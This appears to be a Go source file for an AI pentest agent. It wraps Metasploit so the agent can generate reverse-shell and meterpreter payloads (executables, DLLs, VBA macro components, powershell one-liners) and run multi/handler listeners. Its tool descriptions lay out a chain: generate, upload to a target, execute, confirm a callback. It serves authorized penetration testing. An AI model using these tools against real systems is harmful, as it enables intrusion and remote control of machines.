package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/TaxMachine/ARTEX/machine"
	actool "github.com/TaxMachine/ARTEX/third_party/norma/tool"
)

// Metasploit tools: msfvenom payload generation + msfconsole handler
// management, for proving RCEs with a real shell callback instead of a
// calc.exe popup. Handlers run detached on the ARTEX host; their console
// transcripts are polled for session events and kept in the registry below so
// the agent can check a callback landed without an interactive terminal.

// msfHandler is one running multi/handler. Dir holds the resource file +
// transcript; Started/Sessions track lifecycle for listing.
type msfHandler struct {
	ID         string    `json:"id"`
	Payload    string    `json:"payload"`
	LHOST      string    `json:"lhost"`
	LPORT      int       `json:"lport"`
	Dir        string    `json:"dir"`
	Started    time.Time `json:"started"`
	Transcript string    `json:"transcript"`
	captured   bool      // auto-pcap fired for the first session
}

var (
	msfMu       sync.Mutex
	msfHandlers = map[string]*msfHandler{}
	msfSeq      int
)

// msfBin resolves an msf binary, preferring the omnibus install then PATH.
func msfBin(name string) string {
	for _, p := range []string{
		filepath.Join("/opt/metasploit-framework/bin", name),
		filepath.Join("/usr/bin", name),
	} {
		if st, err := os.Stat(p); err == nil && !st.IsDir() {
			return p
		}
	}
	return name // PATH fallback
}

func (t *ToolSet) msfPayloadGen() (fn string, ok bool) {
	fn = msfBin("msfvenom")
	if _, err := exec.LookPath(fn); err != nil {
		// absolute path that does not exist either
		if _, err2 := os.Stat(fn); err2 != nil {
			return "", false
		}
	}
	return fn, true
}

func (t *ToolSet) msfPayload() actool.CoreTool {
	return writeTool("msf_payload",
		"Generate an exploit payload with msfvenom: meterpreter or shell, any platform/format, staged or stageless — e.g. windows/x64/meterpreter/reverse_tcp as exe or raw, a DLL to load from a document macro, or a powershell one-liner. Output lands in this run's working directory (never /tmp) and the absolute path is returned. Use it to build the exact artifact a PoC needs (dropper for a confirmed RCE, malicious document component), then stage it on a machine with ssh_upload.",
		obj(map[string]any{
			"payload": str("msfvenom payload id, e.g. windows/x64/meterpreter/reverse_tcp, windows/x64/shell_reverse_tcp, linux/x64/shell_bind_tcp"),
			"format":  str("output format: exe, dll, raw, powershell, vba, vba-exe, python, ruby, elf, msi..."),
			"lhost":   str("callback IP the target reaches (the ARTEX host's address on the machine network, e.g. 172.19.0.1)"),
			"lport":   map[string]any{"type": "integer", "description": "callback port (default 4444)"},
			"outfile": str("output file name (default payload-<n>.<format>)"),
			"extras":  map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "extra msfvenom arguments (-e encoder, -i iterations, -b badchars, -k, --smallest...)"},
		}, "payload", "format", "lhost"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			bin, ok := t.msfPayloadGen()
			if !ok {
				return actool.Errorf("msfvenom not installed on this server"), nil
			}
			var a struct {
				Payload string   `json:"payload"`
				Format  string   `json:"format"`
				LHOST   string   `json:"lhost"`
				LPORT   int      `json:"lport"`
				Outfile string   `json:"outfile"`
				Extras  []string `json:"extras"`
			}
			_ = json.Unmarshal(in, &a)
			if a.Payload == "" || a.Format == "" || a.LHOST == "" {
				return actool.Errorf("payload, format and lhost are required"), nil
			}
			if a.LPORT == 0 {
				a.LPORT = 4444
			}
			dir := t.artifactDir
			if dir == "" {
				dir = os.TempDir()
			}
			out := a.Outfile
			if out == "" {
				out = fmt.Sprintf("payload-%d.%s", time.Now().Unix(), a.Format)
			}
			out = filepath.Join(dir, filepath.Base(out))
			args := []string{"-p", a.Payload, "LHOST=" + a.LHOST, fmt.Sprintf("LPORT=%d", a.LPORT), "-f", a.Format, "-o", out}
			// vba formats take a different generator path but same flags; extras pass through verbatim
			args = append(args, a.Extras...)
			cctx, cancel := context.WithTimeout(ctx, 2*time.Minute)
			defer cancel()
			cmd := exec.CommandContext(cctx, bin, args...)
			var outBuf, errBuf strings.Builder
			cmd.Stdout = &outBuf
			cmd.Stderr = &errBuf
			if err := cmd.Run(); err != nil {
				return actool.Errorf(fmt.Sprintf("msfvenom failed: %v: %s", err, truncateMsf(errBuf.String(), 600))), nil
			}
			st, _ := os.Stat(out)
			return jsonResult(map[string]any{
				"path": out, "bytes": stSize(st), "format": a.Format, "payload": a.Payload,
				"lhost": a.LHOST, "lport": a.LPORT,
			})
		})
}

// truncateMsf caps a string for tool output.
func truncateMsf(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func stSize(st os.FileInfo) int64 {
	if st == nil {
		return 0
	}
	return st.Size()
}

func (t *ToolSet) msfHandlerStart() actool.CoreTool {
	return writeTool("msf_handler_start",
		"Start a detached Metasploit multi/handler for a reverse payload (exploit/multi/handler with the same payload/lhost/lport as the generated artifact). Returns a handler id; poll msf_handler_status for session open events in the transcript. Combine: msf_payload -> ssh_upload to the target -> execute -> msf_handler_start (or start first) -> msf_handler_status shows 'Meterpreter session N opened' = RCE proven with a real shell.",
		obj(map[string]any{
			"payload":         str("payload id matching the artifact, e.g. windows/x64/meterpreter/reverse_tcp"),
			"lhost":           str("listen address (0.0.0.0 or the machine-network IP, default 0.0.0.0)"),
			"lport":           map[string]any{"type": "integer", "description": "listen port (default 4444)"},
			"exit_on_session": map[string]any{"type": "boolean", "description": "exit after the first session (default false: keep listening)"},
		}, "payload", "lport"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			bin := msfBin("msfconsole")
			if _, err := os.Stat(bin); err != nil {
				if _, err2 := exec.LookPath(bin); err2 != nil {
					return actool.Errorf("msfconsole not installed on this server"), nil
				}
			}
			var a struct {
				Payload       string `json:"payload"`
				LHOST         string `json:"lhost"`
				LPORT         int    `json:"lport"`
				ExitOnSession bool   `json:"exit_on_session"`
			}
			_ = json.Unmarshal(in, &a)
			if a.Payload == "" {
				return actool.Errorf("payload is required"), nil
			}
			if a.LHOST == "" {
				a.LHOST = "0.0.0.0"
			}
			if a.LPORT == 0 {
				a.LPORT = 4444
			}
			msfMu.Lock()
			msfSeq++
			id := fmt.Sprintf("msf-%d-%d", time.Now().Unix(), msfSeq)
			h := &msfHandler{ID: id, Payload: a.Payload, LHOST: a.LHOST, LPORT: a.LPORT, Started: time.Now()}
			msfHandlers[id] = h
			msfMu.Unlock()

			dir := t.artifactDir
			if dir == "" {
				dir = os.TempDir()
			}
			h.Dir = dir
			rc := filepath.Join(dir, id+".rc")
			log := filepath.Join(dir, id+".log")
			h.Transcript = log
			exit := ""
			if a.ExitOnSession {
				exit = "exit-on-session\n"
			}
			resource := fmt.Sprintf("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST %s\nset LPORT %d\nset ExitOnSession %s\nrun -z\n%s",
				a.Payload, a.LHOST, a.LPORT, boolStr(a.ExitOnSession, "true", "false"), exit)
			if err := os.WriteFile(rc, []byte(resource), 0o644); err != nil {
				return actool.Errorf("resource write failed: " + err.Error()), nil
			}
			// detached: the console outlives this tool call; -q skips the banner
			cmd := exec.Command(bin, "-q", "-r", rc)
			lf, err := os.OpenFile(log, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
			if err != nil {
				return actool.Errorf("log open failed: " + err.Error()), nil
			}
			cmd.Stdout = lf
			cmd.Stderr = lf
			if err := cmd.Start(); err != nil {
				lf.Close()
				return actool.Errorf("msfconsole start failed: " + err.Error()), nil
			}
			go func() { _ = cmd.Wait(); lf.Close() }()
			return jsonResult(map[string]any{"id": id, "payload": a.Payload, "lhost": a.LHOST, "lport": a.LPORT, "transcript": log})
		})
}

func (t *ToolSet) msfHandlerStatus() actool.CoreTool {
	return readTool("msf_handler_status",
		"Check one running handler (or list all): tail its transcript, report whether a session opened ('session N opened' / 'Meterpreter session'), the listener state, and how long it has run. The positive line to look for when proving an RCE: 'Meterpreter session <n> opened' or 'Command session session <n> opened'.",
		obj(map[string]any{
			"id": str("handler id from msf_handler_start (empty = list all handlers)"),
		}, ""),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct{ ID string }
			_ = json.Unmarshal(in, &a)
			msfMu.Lock()
			defer msfMu.Unlock()
			list := func() []map[string]any {
				out := []map[string]any{}
				for _, h := range msfHandlers {
					out = append(out, handlerStatus(h))
				}
				return out
			}
			if a.ID == "" {
				return jsonResult(map[string]any{"handlers": list()})
			}
			h, ok := msfHandlers[a.ID]
			if !ok {
				return actool.Errorf("unknown handler " + a.ID), nil
			}
			return jsonResult(handlerStatus(h))
		})
}

// msfAutoCapture: when a handler first sees a session open, start a packet
// capture on each reachable registered machine so the proof automatically
// carries its pcap — handler transcript + pcap is the complete RCE evidence
// standard without the agent remembering capture_start. Best effort.
func msfAutoCapture(port int) {
	svc := machine.Default()
	if svc == nil {
		return
	}
	list, err := svc.List()
	if err != nil {
		return
	}
	filter := fmt.Sprintf("tcp port %d", port)
	for i := range list {
		m := list[i]
		go func(name string) {
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
			defer cancel()
			_, _ = svc.CaptureStart(ctx, 0, name, "", filter, "", 0)
		}(m.Name)
	}
}

func handlerStatus(h *msfHandler) map[string]any {
	tail := ""
	if b, err := os.ReadFile(h.Transcript); err == nil {
		lines := strings.Split(strings.TrimSpace(string(b)), "\n")
		if len(lines) > 40 {
			lines = lines[len(lines)-40:]
		}
		tail = strings.Join(lines, "\n")
	}
	session := strings.Contains(tail, "session") && strings.Contains(tail, "opened")
	meterpreter := strings.Contains(tail, "Meterpreter session")
	if session && !h.captured {
		h.captured = true
		msfAutoCapture(h.LPORT)
	}
	return map[string]any{
		"id": h.ID, "payload": h.Payload, "lhost": h.LHOST, "lport": h.LPORT,
		"started": h.Started.Format(time.RFC3339), "age_seconds": int(time.Since(h.Started).Seconds()),
		"session_opened": session, "meterpreter": meterpreter, "transcript_tail": tail,
	}
}

func (t *ToolSet) msfHandlerStop() actool.CoreTool {
	return writeTool("msf_handler_stop",
		"Stop a detached handler and remove it from the registry. Call when the RCE proof is recorded (transcript excerpts go into the finding evidence) or the callback window has passed.",
		obj(map[string]any{
			"id": str("handler id from msf_handler_start"),
		}, "id"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct{ ID string }
			_ = json.Unmarshal(in, &a)
			msfMu.Lock()
			h, ok := msfHandlers[a.ID]
			if ok {
				delete(msfHandlers, a.ID)
			}
			msfMu.Unlock()
			if !ok {
				return actool.Errorf("unknown handler " + a.ID), nil
			}
			// the console runs `run -z` (background); kill by transcript marker is
			// unreliable, so pkill the exact resource file argument
			if h.Dir != "" {
				rc := filepath.Join(h.Dir, h.ID+".rc")
				_ = exec.Command("pkill", "-f", rc).Run()
			}
			return jsonResult(map[string]any{"stopped": h.ID})
		})
}

func boolStr(b bool, t, f string) string {
	if b {
		return t
	}
	return f
}

// MsfTools returns the metasploit tool set for host injection (server side);
// the same instances back the worker/pentest base lists via the catalog.
func (t *ToolSet) MsfTools() []actool.CoreTool {
	return []actool.CoreTool{t.msfPayload(), t.msfHandlerStart(), t.msfHandlerStatus(), t.msfHandlerStop()}
}
